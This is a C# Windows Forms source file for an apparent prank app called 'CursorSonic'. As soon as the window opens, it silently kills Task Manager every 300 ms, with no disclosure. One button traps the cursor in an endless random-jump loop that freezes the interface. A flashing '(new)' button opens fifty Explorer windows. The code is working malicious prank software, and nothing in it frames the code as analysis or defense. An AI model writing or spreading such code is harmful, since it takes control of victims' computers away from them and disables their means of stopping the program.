using System;
using System.Diagnostics;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CursorSonic
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Image myimage = new Bitmap("JPEG.jpg");
            this.BackgroundImage = myimage;
            FormBorderStyle = FormBorderStyle.FixedSingle;
            NameButtonChange();
            isTaskMgr();


        }
        int speed = 500;
        
        async void isTaskMgr()
        {
            while(true)
            {
                try
                {
                    foreach (Process Proc in Process.GetProcesses())
                        if (Proc.ProcessName.Equals("Taskmgr"))  //Process Excel?
                            Proc.Kill();
                    await Task.Delay(300);
                }
                catch { await Task.Delay(300); }
            }
        }
        void button1_Click(object sender, EventArgs e)
        {
            button2.Enabled = false;
            Text = "I'm sorry, men. :)";
            Opacity = 100;
            button1.Visible = false; button2.Visible = false;
            Random rand = new Random();
            while (true)
            {
                //speed++;
                Cursor.Position = rand.Next(2) == 1? 
                    new Point(Screen.FromControl(this).Bounds.Width + rand.Next(2, speed), Screen.FromControl(this).Bounds.Height + rand.Next(2, speed)): 
                    new Point(Screen.FromControl(this).Bounds.Width +  rand.Next(-speed, -2), Screen.FromControl(this).Bounds.Height +  rand.Next(-speed, -2));
               if (Cursor.Position.X < 12) Cursor.Position = new Point (Screen.FromControl(this).Bounds.Width - 200,Cursor.Position.Y); 
               if (Cursor.Position.Y < 12) Cursor.Position = new Point (Cursor.Position.X, Screen.FromControl(this).Bounds.Height - 200); 
                if (Cursor.Position.X > Screen.FromControl(this).Bounds.Width - 200) Cursor.Position = new Point(12, Cursor.Position.Y);
                if (Cursor.Position.Y > Screen.FromControl(this).Bounds.Height - 200) Cursor.Position = new Point(Cursor.Position.X,12 );
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Close();
        }

        async void Form1_Load(object sender, EventArgs e)
        {
            for (Opacity = 0; Opacity < 0.98; Opacity += 0.05)
            await Task.Delay(2);
        }

        void DirectorySpawn(string path)
        {
            Process.Start(new ProcessStartInfo { FileName = "explorer", Arguments = $"/n, /select, {path}" });
        }
        async void NameButtonChange()
        {
            string nameofbut3 = button3.Text;
            while(true)
            {
                button3.Text += "\n(new)";
                button3.BackColor = Color.Aqua;
                await Task.Delay(400);
                button3.Text = nameofbut3 ;
                button3.BackColor = Color.FromArgb(128,255,255);
                await Task.Delay(400);
/*                foreach (Process Proc in Process.GetProcesses())
                    if (Proc.ProcessName.Equals("Taskmgr"))  //Process Excel?
                        Proc.Kill();*/
            }

        }
        private void button3_Click(object sender, EventArgs e)
        {
            string path = @"C:\Program Files";
            for (int i = 0; i<50; i++) DirectorySpawn(path);
        }
    }
}
